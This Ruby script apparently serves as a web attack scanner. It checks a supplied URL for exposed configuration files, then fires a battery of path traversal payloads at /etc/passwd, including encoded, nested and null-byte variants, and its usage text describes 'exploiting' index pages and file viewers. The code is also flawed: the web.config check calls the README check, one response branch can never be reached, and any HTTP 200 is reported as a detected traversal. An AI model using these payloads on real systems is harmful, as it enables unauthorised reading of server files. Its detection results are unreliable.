require 'net/http'
require 'open-uri'

def check_file(url, file)
  uri = URI.join(url, file)
  response = Net::HTTP.get_response(uri)

  case response
  when Net::HTTPSuccess
    puts "File #{file} exists"
    return true
  when Net::HTTPRedirection
    puts "Redirect detected for #{file}"
    return false
  when Net::HTTPNotFound
    puts "404 Error for #{file}"
    return false
  when Net::HTTPForbidden
    puts "403 Forbidden for #{file}"
    return false
  when Net::HTTPFound
    puts "302 Found for #{file}"
    return false
  else
    puts "Unexpected error for #{file}: #{response.code} #{response.message}"
    return false
  end
end

def check_robots_txt(url)
  check_file(url, 'robots.txt')
end

def check_sitemap_xml(url)
  check_file(url, 'sitemap.xml')
end

def check_htaccess(url)
  check_file(url, '.htaccess')
end

def check_phpini(url)
  check_file(url, 'php.ini')
end

def check_readme(url)
  check_file(url, 'README.md')
end

def check_webconfig(url)
  check_file(url, 'web.config')
end

def check_pathtraversal3(url)
  check_file(url, '../../../etc/passwd')
end

def check_pathtraversal4(url)
  check_file(url, '../../../../etc/passwd')
end

def check_pathtraversal1(url)
  check_file(url, 'etc/passwd')
end

def check_pathtraversalnesting(url)
  check_file(url, '....//....//etc/passwd')
end

def check_pathtraversal3encoded(url)
  check_file(url, '..%2F..%2F..%2Fetc%2Fpasswd')
end

def check_pathtraversal4encoded(url)
  check_file(url, '..%2F..%2F..%2F..%2Fetc%2Fpasswd')
end

def check_pathtraversal1encoded(url)
  check_file(url, 'etc%2Fpasswd')
end

def check_pathtraversalnestingencoded(url)
  check_file(url, '....%2F%2F....%2F%2Fetc%2Fpasswd')
end

def check_pathtraversalnullbytepng(url)
  check_file(url, '../../../../etc/passwd%00.png')
end

def check_pathtraversalfullpath(url)
  check_file(url, 'var/www/html/../../../etc/passwd')
end

def usage
  puts "Usage: ruby script.rb <website_url>"
  puts "Must include / on the end if exploiting the index page. Example <https://example.com/>"
  puts "In case of exploiting fileviewer paste it in this format <https://example.com/view=>"
end

if ARGV.empty?
  usage
else
  website_url = ARGV[0]
  puts "Checking robots.txt..."
  puts "Robots.txt exists: #{check_robots_txt(website_url)}"

  puts "\nChecking sitemap.xml..."
  puts "Sitemap.xml exists: #{check_sitemap_xml(website_url)}"

  puts "\nChecking .htaccess..."
  puts ".htaccess exists: #{check_htaccess(website_url)}"

  puts "\nChecking php.ini"
  puts "php.ini exists: #{check_phpini(website_url)}"

  puts "\nChecking README.md"
  puts "README.md exists: #{check_readme(website_url)}"

  puts "\nChecking web.config"
  puts "web.config exists: #{check_readme(website_url)}"

  puts "\nPATH TRAVERSAL SCAN STARTING..."
  puts "================================="

  puts "\nChecking ../../../etc/passwd ..."
  puts "Path traversal detected: #{check_pathtraversal3(website_url)}"

  puts "\nChecking ../../../../etc/passwd ..."
  puts "Path traversal detected: #{check_pathtraversal4(website_url)}"

  puts "\nChecking /etc/passwd ..."
  puts "Path traversal detected: #{check_pathtraversal1(website_url)}"

  puts "\nChecking ....//....//etc/passwd ..."
  puts "Path traversal detected: #{check_pathtraversalnesting(website_url)}"

  puts "\nChecking the nullbyte vulnerability /../../../../etc/passwd%00.png ..."
  puts "Path traversal detected: #{check_pathtraversalnullbytepng(website_url)}"

  puts "\nChecking /var/www/html/../../../etc/passwd"
  puts "Path traversal detected: #{check_pathtraversalfullpath(website_url)}"
  
  puts "\nChecking the URL Encoding path traversal vulnerabilities!"
  puts "==========================================================="

  puts "\nChecking %2F..%2F..%2F..%2Fetc%2Fpasswd"
  puts "Path traversal detected: #{check_pathtraversal3encoded(website_url)}"

  puts "\nChecking %2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
  puts "Path traversal detected: #{check_pathtraversal4encoded(website_url)}"

  puts "\nChecking %2Fetc%2Fpasswd"
  puts "Path traversal detected: #{check_pathtraversal1encoded(website_url)}"

  puts "\nChecking %2F....%2F%2F....%2F%2Fetc%2Fpasswd"
  puts "Path traversal detected: #{check_pathtraversalnestingencoded(website_url)}"
end
